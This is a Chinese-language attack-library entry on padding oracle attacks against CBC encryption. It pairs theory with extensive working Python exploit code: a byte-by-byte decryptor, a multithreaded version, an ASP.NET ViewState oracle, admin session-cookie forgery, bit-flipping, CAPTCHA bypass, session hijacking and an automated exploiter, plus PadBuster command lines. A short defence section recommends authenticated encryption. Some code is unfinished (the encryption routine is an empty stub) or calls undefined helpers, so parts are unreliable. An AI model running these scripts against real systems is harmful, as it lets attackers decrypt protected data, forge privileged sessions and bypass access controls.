# 密码学-Padding Oracle攻击 攻击库

## 漏洞概述

Padding Oracle Attack(填充预言攻击)是一种针对使用CBC(Cipher Block Chaining)模式的块加密算法的密码学攻击。当应用程序在解密时返回不同的错误信息来区分padding有效性时,攻击者可以利用这个"预言机"(oracle)逐字节解密密文,甚至在不知道密钥的情况下解密整个消息。

**攻击价值**:
- 解密加密的敏感数据
- 绕过基于加密的访问控制
- 伪造加密的会话令牌
- 破解加密的CAPTCHA
- 篡改加密数据

**常见场景**:
- Cookie加密(ASP.NET ViewState, PHP sessions)
- CAPTCHA验证
- 加密的认证令牌
- 加密的API令牌
- 文件加密

## 核心攻击原理

### 1. CBC模式加密/解密

**加密过程**:
```
C[0] = E(P[0] XOR IV, Key)
C[i] = E(P[i] XOR C[i-1], Key)

其中:
P = 明文块
C = 密文块
IV = 初始化向量
E = 加密函数
```

**解密过程**:
```
P[0] = D(C[0], Key) XOR IV
P[i] = D(C[i], Key) XOR C[i-1]

其中:
D = 解密函数
```

### 2. PKCS7填充

**填充规则**:
```
明文长度 % 块大小 | 填充内容
-------------------|-------------
剩余1字节          | 01
剩余2字节          | 02 02
剩余3字节          | 03 03 03
...                | ...
剩余0字节(整块)    | 10 10 10 ... 10 (16个0x10)
```

**示例**:
```
明文: "HELLO"  (5字节)
块大小: 16字节
填充: 0B 0B 0B 0B 0B 0B 0B 0B 0B 0B 0B (11个0x0B)
结果: HELLO\x0B\x0B\x0B\x0B\x0B\x0B\x0B\x0B\x0B\x0B\x0B
```

### 3. Padding Oracle原理

**漏洞条件**:
1. 应用使用CBC模式加密
2. 解密时检查padding有效性
3. 返回不同的错误信息区分padding错误

**利用方法**:
1. 修改C[i-1]的最后一个字节
2. 观察解密后padding是否有效
3. 如果有效,推导P[i]的最后一个字节
4. 重复直到解密所有字节

**数学原理**:
```
P[i] = D(C[i], Key) XOR C[i-1]

如果我们修改C[i-1],padding有效时:
P'[i] = D(C[i], Key) XOR C'[i-1]

当padding有效时,最后一个字节必须是0x01:
D(C[i], Key)[15] XOR C'[i-1][15] = 0x01

因此:
D(C[i], Key)[15] = 0x01 XOR C'[i-1][15]
P[i][15] = D(C[i], Key)[15] XOR C[i-1][15]
        = (0x01 XOR C'[i-1][15]) XOR C[i-1][15]
```

## 核心攻击技术

### 1. 基础Padding Oracle攻击

**场景**: CAPTCHA验证,返回"Invalid padding"错误

**Python实现**:

```python
#!/usr/bin/env python3
import requests
import base64
from itertools import product

class PaddingOracle:
    """Padding Oracle攻击基础实现"""
    
    def __init__(self, oracle_url, cookie_name='captcha'):
        self.oracle_url = oracle_url
        self.cookie_name = cookie_name
    
    def oracle(self, ciphertext_b64):
        """
        Padding oracle函数
        
        返回:
            True: padding有效
            False: padding无效
        """
        cookies = {self.cookie_name: ciphertext_b64}
        
        try:
            response = requests.post(
                self.oracle_url,
                data={'captcha': 'test'},
                cookies=cookies,
                timeout=5
            )
            
            # 检查是否返回padding错误
            return "Invalid padding" not in response.text.lower()
        
        except Exception as e:
            return False
    
    def decrypt_block(self, ciphertext_block, prev_block):
        """
        解密单个块
        
        参数:
            ciphertext_block: 当前密文块(16字节)
            prev_block: 前一个密文块或IV(16字节)
        
        返回:
            decrypted: 解密的明文块(16字节)
        """
        block_size = 16
        decrypted = bytearray(block_size)
        
        # 从最后一个字节开始逐字节解密
        for pad_len in range(1, block_size + 1):
            print(f"[*] 解密字节 {block_size - pad_len + 1}/{block_size}...", end='\r')
            
            # 构造测试块
            test_block = bytearray(prev_block)
            
            # 设置已解密的字节产生正确的padding
            for i in range(block_size - pad_len + 1, block_size):
                test_block[i] = decrypted[i] ^ pad_len
            
            # 暴力破解当前字节(0-255)
            found = False
            for guess in range(256):
                test_block[block_size - pad_len] = guess
                
                # 测试padding是否有效
                test_cipher = bytes(test_block) + ciphertext_block
                test_b64 = base64.b64encode(test_cipher).decode()
                
                if self.oracle(test_b64):
                    # 找到有效padding,计算中间值
                    decrypted[block_size - pad_len] = guess ^ pad_len
                    found = True
                    break
            
            if not found:
                print(f"[!] 警告: 字节 {block_size - pad_len} 未找到有效值")
        
        # XOR前一个块得到明文
        plaintext = bytes([decrypted[i] ^ prev_block[i] for i in range(block_size)])
        
        return plaintext
    
    def decrypt_message(self, encrypted_b64):
        """
        解密完整消息
        
        参数:
            encrypted_b64: Base64编码的加密数据(IV + Ciphertext)
        
        返回:
            plaintext: 解密的明文
        """
        encrypted_data = base64.b64decode(encrypted_b64)
        
        block_size = 16
        iv = encrypted_data[:block_size]
        ciphertext = encrypted_data[block_size:]
        
        # 计算块数
        num_blocks = len(ciphertext) // block_size
        
        print(f"[*] IV: {iv.hex()}")
        print(f"[*] 密文长度: {len(ciphertext)} 字节")
        print(f"[*] 块数: {num_blocks}\n")
        
        plaintext = b''
        
        # 逐块解密
        for block_num in range(num_blocks):
            print(f"\n[*] 解密块 {block_num + 1}/{num_blocks}")
            
            block_start = block_num * block_size
            block_end = block_start + block_size
            current_block = ciphertext[block_start:block_end]
            
            # 前一个块(第一块使用IV)
            if block_num == 0:
                prev_block = iv
            else:
                prev_block = ciphertext[block_start - block_size:block_start]
            
            # 解密当前块
            decrypted_block = self.decrypt_block(current_block, prev_block)
            plaintext += decrypted_block
            
            print(f"[+] 块 {block_num + 1} 解密: {decrypted_block.hex()}")
        
        # 移除PKCS7填充
        plaintext = self._unpad(plaintext)
        
        return plaintext
    
    def _unpad(self, data):
        """移除PKCS7填充"""
        if not data:
            return data
        
        pad_len = data[-1]
        
        # 验证padding
        if pad_len > 16 or pad_len == 0:
            return data
        
        for i in range(pad_len):
            if data[-(i+1)] != pad_len:
                return data
        
        return data[:-pad_len]

# 使用示例
if __name__ == "__main__":
    oracle = PaddingOracle("http://target.com/captcha", "captcha")
    
    # 获取加密的cookie
    response = requests.get("http://target.com/captcha")
    encrypted_cookie = response.cookies.get('captcha')
    
    print(f"[*] 加密Cookie: {encrypted_cookie[:50]}...")
    
    # 解密
    plaintext = oracle.decrypt_message(encrypted_cookie)
    
    print(f"\n{'='*60}")
    print(f"[+] 解密成功!")
    print(f"[+] 明文: {plaintext}")
    print(f"[+] 明文(hex): {plaintext.hex()}")
    print(f"{'='*60}")
```

### 2. 优化的Padding Oracle攻击

**优化技术**:
- 多线程加速
- 智能猜测(常见字符优先)
- 缓存中间结果

**优化实现**:

```python
import threading
from queue import Queue

class OptimizedPaddingOracle(PaddingOracle):
    """优化的Padding Oracle攻击"""
    
    def __init__(self, oracle_url, cookie_name='captcha', threads=10):
        super().__init__(oracle_url, cookie_name)
        self.threads = threads
    
    def decrypt_block_parallel(self, ciphertext_block, prev_block):
        """并行解密块"""
        
        block_size = 16
        decrypted = bytearray(block_size)
        
        for pad_len in range(1, block_size + 1):
            # 为每个字节创建任务队列
            queue = Queue()
            result = {'found': False, 'value': None}
            
            # 添加所有可能的字节值到队列
            # 优先尝试常见字符
            common_bytes = list(range(32, 127)) + list(range(256))
            for guess in common_bytes:
                queue.put(guess)
            
            def worker():
                while not queue.empty() and not result['found']:
                    try:
                        guess = queue.get(timeout=0.1)
                        
                        test_block = bytearray(prev_block)
                        
                        # 设置已知字节
                        for i in range(block_size - pad_len + 1, block_size):
                            test_block[i] = decrypted[i] ^ pad_len
                        
                        test_block[block_size - pad_len] = guess
                        
                        # 测试padding
                        test_cipher = bytes(test_block) + ciphertext_block
                        test_b64 = base64.b64encode(test_cipher).decode()
                        
                        if self.oracle(test_b64):
                            result['found'] = True
                            result['value'] = guess ^ pad_len
                            decrypted[block_size - pad_len] = result['value']
                    
                    except:
                        pass
            
            # 启动工作线程
            threads = []
            for _ in range(self.threads):
                t = threading.Thread(target=worker)
                t.daemon = True
                t.start()
                threads.append(t)
            
            # 等待找到结果
            for t in threads:
                t.join(timeout=30)
            
            if not result['found']:
                print(f"[!] 字节 {block_size - pad_len} 未找到")
                return None
        
        # XOR得到明文
        plaintext = bytes([decrypted[i] ^ prev_block[i] for i in range(block_size)])
        return plaintext
```

### 3. 使用padbuster工具

**工具介绍**: padbuster是专业的Padding Oracle攻击工具

**安装**:
```bash
git clone https://github.com/AonCyberLabs/PadBuster.git
cd PadBuster
```

**使用示例**:

```bash
# 基础用法
./padBuster.pl http://target.com/app \
    "ENCRYPTED_COOKIE_VALUE" \
    16 \
    -cookies "session=ENCRYPTED_COOKIE_VALUE" \
    -encoding 0

# 解密特定数据
./padBuster.pl http://target.com/app \
    "u7bvLewln6PJPSAbMb4MRW02DDopSVJFxQ==" \
    16 \
    -cookies "auth=u7bvLewln6PJPSAbMb4MRW02DDopSVJFxQ==" \
    -encoding 0 \
    -plaintext

# 加密自定义数据
./padBuster.pl http://target.com/app \
    "u7bvLewln6PJPSAbMb4MRW02DDopSVJFxQ==" \
    16 \
    -cookies "auth=u7bvLewln6PJPSAbMb4MRW02DDopSVJFxQ==" \
    -encoding 0 \
    -plaintext "admin:1"
```

### 4. ASP.NET ViewState解密

**场景**: ASP.NET ViewState使用Padding Oracle

**利用脚本**:

```python
def decrypt_viewstate(viewstate_b64, oracle_url):
    """解密ASP.NET ViewState"""
    
    class ViewStateOracle(PaddingOracle):
        def oracle(self, ciphertext_b64):
            # ASP.NET返回500错误表示padding无效
            data = {
                '__VIEWSTATE': ciphertext_b64,
                '__EVENTVALIDATION': ''
            }
            
            response = requests.post(oracle_url, data=data)
            
            # 200 = 有效padding
            # 500 = 无效padding
            return response.status_code != 500
    
    oracle = ViewStateOracle(oracle_url)
    plaintext = oracle.decrypt_message(viewstate_b64)
    
    return plaintext
```

### 5. Session Cookie伪造

**攻击流程**:
1. 使用Padding Oracle解密session cookie
2. 修改用户权限(如user→admin)
3. 使用Padding Oracle加密修改后的数据
4. 使用伪造的cookie访问应用

**实现**:

```python
def forge_admin_session(oracle, original_cookie):
    """伪造管理员session"""
    
    # 步骤1: 解密原始cookie
    print("[*] 解密原始session...")
    plaintext = oracle.decrypt_message(original_cookie)
    print(f"[+] 原始session: {plaintext}")
    
    # 步骤2: 修改session
    # 假设格式为 "user:role"
    modified = plaintext.replace(b'user', b'admin')
    print(f"[*] 修改session: {modified}")
    
    # 步骤3: 加密修改后的session
    print("[*] 加密新session...")
    forged_cookie = oracle.encrypt_message(modified)
    
    print(f"[+] 伪造的cookie: {forged_cookie}")
    
    return forged_cookie

class PaddingOracleEncrypt(PaddingOracle):
    """Padding Oracle加密(通过解密逆向)"""
    
    def encrypt_message(self, plaintext):
        """加密消息"""
        
        # 添加PKCS7填充
        block_size = 16
        pad_len = block_size - (len(plaintext) % block_size)
        plaintext += bytes([pad_len] * pad_len)
        
        # 分块
        blocks = [plaintext[i:i+block_size] 
                 for i in range(0, len(plaintext), block_size)]
        
        # 逆向构造密文
        # 这需要大量的padding oracle查询
        # 实际上很少使用,因为效率低
        
        # 简化版:直接返回解密后重新加密
        # 实际需要完整实现
        pass
```

## 高级利用技术

### 1. Bit-flipping攻击

**原理**: 修改密文块会影响下一个明文块

**利用**:

```python
def bit_flipping_attack(encrypted_data, target_plaintext, new_plaintext):
    """
    Bit-flipping攻击
    
    修改密文以改变明文的特定位置
    """
    encrypted = bytearray(base64.b64decode(encrypted_data))
    
    # C[i-1] XOR target XOR new = 修改后的C[i-1]
    # 会使 P[i] 从 target 变为 new
    
    block_size = 16
    target_block = 1  # 要修改的明文块
    
    # 修改前一个块
    for i in range(len(target_plaintext)):
        encrypted[(target_block - 1) * block_size + i] ^= \
            target_plaintext[i] ^ new_plaintext[i]
    
    return base64.b64encode(bytes(encrypted)).decode()
```

### 2. Lucky 13攻击

**针对TLS的Padding Oracle变种**

### 3. POODLE攻击

**针对SSL 3.0的Padding Oracle攻击**

## 防御措施

**安全的实现**:

```python
# 使用认证加密(AEAD)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def secure_encrypt(plaintext, key):
    """使用AES-GCM(认证加密)"""
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    return nonce + ciphertext

def secure_decrypt(encrypted, key):
    """安全解密"""
    nonce = encrypted[:12]
    ciphertext = encrypted[12:]
    
    try:
        aesgcm = AESGCM(key)
        plaintext = aesgcm.decrypt(nonce, ciphertext, None)
        return plaintext
    except:
        # 统一的错误消息,不泄露padding信息
        raise ValueError("Decryption failed")

# 或使用MAC
def encrypt_then_mac(plaintext, enc_key, mac_key):
    """先加密后MAC"""
    from cryptography.hazmat.primitives import hmac, hashes
    
    # 加密
    ciphertext = aes_cbc_encrypt(plaintext, enc_key)
    
    # 计算MAC
    h = hmac.HMAC(mac_key, hashes.SHA256())
    h.update(ciphertext)
    mac = h.finalize()
    
    return ciphertext + mac

def decrypt_with_mac(encrypted, enc_key, mac_key):
    """验证MAC后解密"""
    from cryptography.hazmat.primitives import hmac, hashes
    
    ciphertext = encrypted[:-32]
    received_mac = encrypted[-32:]
    
    # 先验证MAC
    h = hmac.HMAC(mac_key, hashes.SHA256())
    h.update(ciphertext)
    
    try:
        h.verify(received_mac)
    except:
        raise ValueError("Authentication failed")
    
    # MAC有效,解密
    try:
        plaintext = aes_cbc_decrypt(ciphertext, enc_key)
        return plaintext
    except:
        raise ValueError("Decryption failed")
```

## 实战案例

### 案例1: CAPTCHA绕过

```python
def bypass_captcha(target_url):
    """通过Padding Oracle绕过加密CAPTCHA"""
    
    # 步骤1: 获取加密的CAPTCHA
    response = requests.get(target_url)
    encrypted_captcha = response.cookies.get('captcha')
    
    # 步骤2: 使用Padding Oracle解密
    oracle = PaddingOracle(target_url, 'captcha')
    captcha_text = oracle.decrypt_message(encrypted_captcha)
    
    print(f"[+] 解密的CAPTCHA: {captcha_text.decode()}")
    
    # 步骤3: 提交CAPTCHA
    response = requests.post(
        target_url,
        data={'captcha': captcha_text.decode()},
        cookies={'captcha': encrypted_captcha}
    )
    
    if 'flag' in response.text.lower():
        import re
        flag = re.search(r'flag\{[^}]+\}', response.text, re.I)
        if flag:
            print(f"[+] FLAG: {flag.group()}")
            return flag.group()
    
    return None
```

### 案例2: Session劫持

```python
def hijack_session(target_url, victim_cookie):
    """劫持加密session"""
    
    oracle = PaddingOracle(target_url, 'session')
    
    # 解密受害者session
    victim_session = oracle.decrypt_message(victim_cookie)
    print(f"[*] 受害者session: {victim_session}")
    
    # 使用解密的session信息访问应用
    # ...
```

## 自动化工具集成

```python
#!/usr/bin/env python3
"""
完整的Padding Oracle攻击工具
"""

class PaddingOracleExploiter:
    """综合Padding Oracle利用工具"""
    
    def __init__(self, target_url, cookie_name):
        self.target_url = target_url
        self.cookie_name = cookie_name
        self.oracle = OptimizedPaddingOracle(target_url, cookie_name)
    
    def auto_exploit(self):
        """自动化利用"""
        
        print("[*] 开始Padding Oracle攻击...\n")
        
        # 获取加密数据
        encrypted = self._get_encrypted_cookie()
        if not encrypted:
            print("[-] 无法获取加密cookie")
            return False
        
        # 解密
        plaintext = self.oracle.decrypt_message(encrypted)
        
        if plaintext:
            print(f"\n[+] 解密成功: {plaintext}")
            
            # 尝试利用
            self._exploit_decrypted_data(plaintext, encrypted)
            
            return True
        
        return False
    
    def _get_encrypted_cookie(self):
        """获取加密cookie"""
        response = requests.get(self.target_url)
        return response.cookies.get(self.cookie_name)
    
    def _exploit_decrypted_data(self, plaintext, original_encrypted):
        """利用解密的数据"""
        
        # 根据数据类型进行不同的利用
        plaintext_str = plaintext.decode('utf-8', errors='ignore')
        
        # CAPTCHA场景
        if len(plaintext_str) < 20 and plaintext_str.isalnum():
            print(f"[*] 检测到CAPTCHA: {plaintext_str}")
            self._submit_captcha(plaintext_str, original_encrypted)
        
        # Session场景
        elif ':' in plaintext_str or '{' in plaintext_str:
            print(f"[*] 检测到Session数据")
            # 可以尝试修改权限等
    
    def _submit_captcha(self, captcha, cookie):
        """提交CAPTCHA"""
        response = requests.post(
            self.target_url,
            data={'captcha': captcha},
            cookies={self.cookie_name: cookie}
        )
        
        print(response.text[:500])

# 使用
if __name__ == "__main__":
    exploiter = PaddingOracleExploiter(
        "http://target.com/captcha",
        "captcha"
    )
    exploiter.auto_exploit()
```

## 关键成功要点

1. **识别Oracle**: 应用返回不同错误区分padding有效性
2. **耐心攻击**: 每个字节需要平均128次尝试
3. **网络稳定**: 大量请求需要稳定网络
4. **优化性能**: 使用多线程加速攻击
5. **理解原理**: 深入理解CBC和padding机制

## 成功标志

- 成功解密加密的CAPTCHA文本
- 解密加密的session cookie
- 伪造具有更高权限的cookie
- 绕过基于加密的访问控制
- 获取flag或敏感信息
